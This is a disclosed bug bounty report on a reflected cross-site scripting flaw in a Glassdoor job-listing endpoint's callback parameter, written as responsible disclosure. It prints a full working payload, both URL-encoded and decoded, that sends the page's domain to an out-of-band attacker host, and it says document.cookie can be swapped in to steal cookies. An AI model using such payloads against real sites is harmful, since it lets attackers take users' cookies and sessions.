# Reflected XSS on https://www.glassdoor.com/job-listing/spotlight

## Report Details
- **Report ID**: 1265390
- **URL**: https://hackerone.com/reports/1265390
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-16T13:21:48.877Z
- **Disclosed**: 2021-08-19T15:14:26.186Z

## Reporter
- **Username**: vestige23
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
**Summary:** 
The application is vulnerable to reflected cross-site scripting attacks on the /job-listing/spotlight URI in the callback parameter.

Affected URL or select Asset from In-Scope:
https://www.glassdoor.com/job-listing/spotlight

Affected Parameter:
callback

Vulnerability Type: (see list below)
XSS

Browsers tested:
Firefox

## Steps To Reproduce:

  1. A malicious SVG HTML attribute is inserted into the callback parameter and the value is URL-encoded:
```
    https://www.glassdoor.com/job-listing/spotlight?slots=spotlight-mrec-lf-display&gdBaseUrl=first%2D%2D%3E&adOrderIds=second&callback=%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%3C%68%74%6D%6C%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%6C%6F%63%61%74%69%6F%6E%2F%2A%2A%2F%3D%27%68%74%74%70%73%3A%2F%2F%63%33%72%71%6D%77%6B%79%65%64%66%30%30%30%30%72%33%6D%72%30%67%62%68%6D%34%73%63%79%79%79%79%79%62%2E%69%6E%74%65%72%61%63%74%2E%73%68%2F%27%2B%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%3E%3C%2F%68%74%6D%6C%3E%3C%21%2D%2D
```
  2. The above malicious link is URL-decoded (Burp's Hackvector tags are used to show where URL encoding occurs)
```
https://www.glassdoor.com/job-listing/spotlight?slots=spotlight-mrec-lf-display&gdBaseUrl=first<@urlencode_all>--><@/urlencode_all>&adOrderIds=second&callback=<@urlencode_all><!DOCTYPE html><html><svg/onload=location/**/='https://c3rqmwkyedf0000r3mr0gbhm4scyyyyyb.interact.sh/'+document.domain></html><!--<@/urlencode_all>
```
3. When a victim user clicks the malicious link a web request is made to an attacker-controlled domain with a URI request of "document.cookie" which is "www.glassdoor.com".

## Supporting Material/References (screenshots, logs, videos):
* The attacker's HTML content in the callback parameter is written to the page source.

{F1379067}
* When a victim user clicks the malicious link, a web request is made to the attacker controlled domain with a URI of www.glassdoor.com.

{F1379066}
* The request in image 2 has a referer header of the malicious Glassdoor link, indicating the SVG content generated the web request.

{F1379068}
* In addition, non-HTTPonly cookies can be exfiltrated via this technique. the 'document.domain' payload is modified to document.cookie. 

{F1379079}
* A victim user's cookies are visible in the URI of the resulting web request.

{F1379086}

##Impact Description:
Potential Impact:
An XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.

Details of exploitation scenarios:
* The malicious link could be distributed via phishing or social media to victim users.

## Impact

A XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.

## Attachments
- glassdoor2.png
- glassdoor1.png
- glassdoor3.png
- glassdoor4.png
- glassdoor5.png
